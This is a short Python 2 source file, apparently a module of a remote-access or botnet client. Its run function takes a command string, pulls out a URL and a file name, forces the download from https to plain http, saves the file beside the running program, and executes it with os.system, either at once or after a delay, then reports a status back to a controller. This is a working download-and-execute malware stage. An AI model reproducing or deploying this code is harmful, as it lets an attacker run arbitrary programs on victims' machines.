import sys
import os
from threading import Thread
from time import sleep
import utils
import requests
import shutil
import urllib2



def find_between( s, first, last ):
    try:
        start = s.index( first ) + len( first )
        end = s.index( last, start )
        return s[start:end]
    except ValueError:
        return ""

def ExecuteD(file):
	global SAVERES
	try:
		os.system(file)	
		if SAVERES == True:
			utils.send_output("MD-STATUS:200")
	except:
		if SAVERES == True:
			utils.send_output("MD-STATUS:200")
		else:
			pass

	
	
	
def DelExe(delay, fname):
	sleep(delay)
	ExecuteD(fname)

	
def mdown(url,dst):
	r = requests.get(url, verify=True,stream=True)
	r.raw.decode_content = True
	with open(dst, 'wb') as f:
		shutil.copyfileobj(r.raw, f)  


def run(payload):
	global SAVERES
	SAVERES = False
	URL = find_between( payload, "URL:" , " ")
	FNAME = find_between( payload, "FNAME:" , " ")
	try:
		URL = URL.replace("https", "http")
	except:
		pass
	FILETRG = os.path.dirname(sys.argv[0]) + "\\" + FNAME

	
	down = Thread(target=mdown, args = (URL,FILETRG, ))
	down.start()
	down.join()
	
	if "SaveResult" in payload:
		SAVERES = True
		
	if "ExecuteOnStart" in payload:
		ExecuteD(FILETRG)
		
	if "ExecuteDelay" in payload:
		delay = find_between ( payload, "ExecuteDelay-", " ")
		Dex = Thread(target=DelExe, args = (delay,FILETRG, ))
		Dex.start()
		

	